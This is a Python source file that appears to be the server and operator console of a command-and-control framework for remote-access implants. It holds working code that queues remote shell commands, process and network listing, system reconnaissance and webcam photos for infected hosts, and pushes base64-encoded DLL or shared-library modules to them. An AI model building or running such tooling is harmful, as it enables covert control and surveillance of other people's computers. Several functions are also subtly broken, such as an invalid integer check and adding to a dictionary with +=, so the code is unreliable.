import readline
from ServerDatabase.database import DatabaseClass
from ..utils.file_manager import FileManagerClass
from ..global_objects import (
    command_list,
    beacon_list,
    logger,
    tab_completion
)

import base64
import uuid
import colorama
import json
import traceback
import os


class beacon_command:
    def __init__(self, command_uuid, beacon_uuid, command, command_output,
                 executed, command_data):
        logger.debug(f"Creating beacon command: {command_uuid} for beacon: {beacon_uuid}")
        self.command_uuid = command_uuid
        self.beacon_uuid = beacon_uuid
        self.command = command
        logger.debug(f"Command: {command}")
        self.command_output = command_output
        self.executed = executed
        self.command_data = command_data
        logger.debug(f"Command data: {command_data}")


class Beacon:
    """Handles commands within a session"""

    def __init__(self, uuid: str, address: str, hostname: str, operating_system: str,
                 last_beacon: float, timer: float, jitter: float, modules: list, config: dict):
        logger.debug(f"Creating beacon with UUID: {uuid}")
        self.uuid = uuid
        self.database = DatabaseClass(config)
        self.file_manager = FileManagerClass(config, uuid)
        self.address = address
        logger.debug(f"Beacon address: {address}")
        self.hostname = hostname
        logger.debug(f"Beacon hostname: {hostname}")
        self.operating_system = operating_system
        logger.debug(f"Beacon operating system: {operating_system}")
        self.last_beacon = last_beacon
        logger.debug(f"Beacon last beacon: {last_beacon}")
        self.next_beacon = str(last_beacon) + str(timer)
        logger.debug(f"Beacon next beacon: {self.next_beacon}")
        self.timer = timer
        logger.debug(f"Beacon timer: {timer}")
        self.jitter = jitter
        logger.debug(f"Beacon jitter: {jitter}")
        self.config = config
        self.loaded_modules = modules
        colorama.init(autoreset=True)

    def close_connection(self, userID) -> None:
        """
        closes connection from the current session within the session commands
        """
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: Y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " + userID)

            try:
                logger.debug(f"Closing connection for beacon: {userID}")
                add_beacon_command_list(userID, None, "shutdown")

            except BaseException:  # handles ssl.SSLEOFError
                logger.error(f"Error closing connection for beacon: {userID}")
                if not self.config['server']['quiet_mode']:
                    print(colorama.Fore.RED + "Traceback:")
                    traceback.print_exc()
                    logger.error(traceback.format_exc())
                pass
            logger.debug(f"Removing beacon from list: {userID}")
            remove_beacon_list(userID)
            print(colorama.Back.GREEN + "Closed")
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed")
        return

    def shell(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        logger.debug(f"Starting shell for userID: {userID} at IP: {IPAddress}")
        print(
            f"Shell {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Command: ")
        logger.debug(f"Shell command: {command}")
        add_beacon_command_list(userID, None, "shell", command)
        logger.debug(f"Shell command added to command list for userID: {userID}")

    def list_dir(self, userID, IPAddress) -> None:
        """runs a shell between the sessions client and server"""
        logger.debug(f"Listing directory for userID: {userID} at IP: {IPAddress}")
        print(
            f"ListDir {IPAddress}: Type exit to quit session, "
            "Please use absolute paths")
        command = input("Directory: ")
        logger.debug(f"List directory command: {command}")
        add_beacon_command_list(userID, None, "list_dir", command)
        logger.debug(f"List directory command added to command list for userID: {userID}")

    def list_processes(self, userID) -> None:
        logger.debug(f"Listing processes for userID: {userID}")
        add_beacon_command_list(userID, None, "list_processes", "")
        logger.debug(f"List processes command added to command list for userID: {userID}")
        return

    def systeminfo(self, userID) -> None:
        """gets the systeminfo of the client"""
        add_beacon_command_list(userID, None, "system_info", "")
        logger.debug(f"Systeminfo command added to command list for userID: {userID}")
        return

    def disk_usage(self, userID) -> None:
        add_beacon_command_list(userID, None, "disk_usage", "")
        logger.debug(f"Disk usage command added to command list for userID: {userID}")
        return

    def dir_traversal(self, userID) -> None:
        add_beacon_command_list(userID, None, "directory_traversal", "")
        logger.debug(f"Directory traversal command added to command list for userID: {userID}")
        return

    def netstat(self, userID) -> None:
        add_beacon_command_list(userID, None, "netstat", "")
        logger.debug(f"Netstat command added to command list for userID: {userID}")
        return

    def takePhoto(self, userID) -> None:
        add_beacon_command_list(userID, None, "snap", "")
        logger.debug(f"Take photo command added to command list for userID: {userID}")
        return

    def list_files(self, userID) -> None:
        data = input("Enter the path to list files: ")
        if not data:
            print("No path provided. Listing files in current directory.")
            data = "."
        logger.debug(f"Listing files for userID: {userID} at path: {data}")
        self.file_manager.list_files(userID, data)
        logger.debug(f"List files for userID: {userID}")
        
    def load_module_beacon(self, userID) -> None:
        command_location = self.config['server']['module_location']
        try:
            platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
            ext = '.dll' if platform_folder == 'windows' else '.so'
            module_dir = os.path.join(command_location, platform_folder)
            files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
            module_names = [os.path.splitext(f)[0] for f in files]
            print("Available modules:")
            for name in module_names:
                print(f" - {name}")
        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return
        readline.set_completer(
                lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return
        logger.debug(f"Loading module '{module_name}' for userID: {userID}")
        self.load_module_direct_beacon(userID, module_name)


    def load_module_direct_beacon(self, userID, module_name) -> None:
        """
        Loads a module directly by its name.
        This is used when the module is already known and does not require user input.
        """
        command_location = self.config['server']['module_location']
        if "windows" in self.operating_system:
            if "debug" in self.operating_system:
                module_path = os.path.join(command_location, "windows", "debug", f"{module_name}.dll")
            else:
                module_path = os.path.join(command_location, "windows", "release", f"{module_name}.dll")
        elif "linux" in self.operating_system:
            if "debug" in self.operating_system:
                module_path = os.path.join(command_location, "linux", "debug", f"{module_name}.so")
            else:   
                module_path = os.path.join(command_location, "linux", "release", f"{module_name}.so")
        else:
            logger.error(f"Unsupported operating system: {self.operating_system}")
            print(f"Unsupported operating system: {self.operating_system}")
            return
        logger.debug(f"Loading module '{module_name}' for userID: {userID} from path: {module_path}")
        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()
                file_data = base64.b64encode(file_data).decode('utf-8')
                add_beacon_command_list(userID, None, "module", {"name": module_name, "data": file_data})
            logger.debug(f"Module '{module_name}' added to command list for userID: {userID}")
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)
        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")

    def list_db_commands(self, userID) -> None:
        logger.debug(f"Listing commands for userID: {userID}")
        for _, beacon_commands in command_list.items():
            if beacon_commands.beacon_uuid == userID:
                logger.debug(f"Command found for userID: {userID} - {beacon_commands.command}")
                logger.debug(f"Command UUID: {beacon_commands.command_uuid}")
                logger.debug(f"Command Output: {beacon_commands.command_output}")
                logger.debug(f"Command Executed: {beacon_commands.executed}")
                print(f"""Command ID: {beacon_commands.command_uuid}
                    Command: {beacon_commands.command}
                    Response: {beacon_commands.command_output if beacon_commands.command_output else "Awaiting Response"}""") # noqa
        return

    def beacon_configueration(self, userID) -> None:
        logger.debug(f"Configuring beacon for userID: {userID}")
        data = {}
        additional_data = "y"
        while additional_data != "n":
            command = input("Enter Configuration command: ")
            value = input("Enter configuration value: ")
            logger.debug(f"Adding configuration command: {command} with value: {value}")
            if value.isinstance(int):
                value = int(value)
            else:
                print("Value must be an integer")
            data += {command: value}
            if (input("Add another confiugration option? (y/N)"
                      ).lower() == "y"):
                continue
            else:
                break
        logger.debug(f"Final configuration data: {data}")
        add_beacon_command_list(userID, None, "beacon_configuration", data)
        return


def add_beacon_list(uuid: str, r_address: str, hostname: str,
                    operating_system: str, last_beacon, timer,
                    jitter, config) -> None:
    logger.debug(f"Adding beacon with UUID: {uuid}")
    logger.debug(f"Beacon address: {r_address}")
    logger.debug(f"Beacon hostname: {hostname}")
    logger.debug(f"Beacon operating system: {operating_system}")
    logger.debug(f"Beacon last beacon: {last_beacon}")
    logger.debug(f"Beacon timer: {timer}")
    logger.debug(f"Beacon jitter: {jitter}")
    new_beacon = Beacon(
        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, ["shell", "close", "session"], config,
    )
    beacon_list[uuid] = new_beacon


def add_beacon_command_list(beacon_uuid: str, command_uuid: str,
                            command: str, command_data: json = {}) -> None:
    logger.debug(f"Adding command for beacon UUID: {beacon_uuid}")
    logger.debug(f"Command UUID: {command_uuid}")
    logger.debug(f"Command: {command}")
    logger.debug(f"Command data: {command_data}")
    if not command_uuid or command_uuid == "":
        command_uuid = str(uuid.uuid4())
        logger.debug(f"Generated new command UUID: {command_uuid}")
    new_command = beacon_command(command_uuid, beacon_uuid,
                                 command, "", False, command_data)
    logger.debug(f"New command created: {new_command}")
    command_list[command_uuid] = new_command


def remove_beacon_list(uuid: str) -> None:
    """
    Removes beacon from the global beacon dictionary.
    """
    logger.debug(f"Removing beacon with UUID: {uuid}")
    if uuid in beacon_list:
        beacon_list.pop(uuid)
        logger.debug(f"Beacon {uuid} removed from beacon list")
    else:
        print(f"Beacon {uuid} not found in beacon list")
        logger.warning(f"Beacon {uuid} not found in beacon list")
    logger.debug(f"Beacon list after removal: {beacon_list.keys()}")
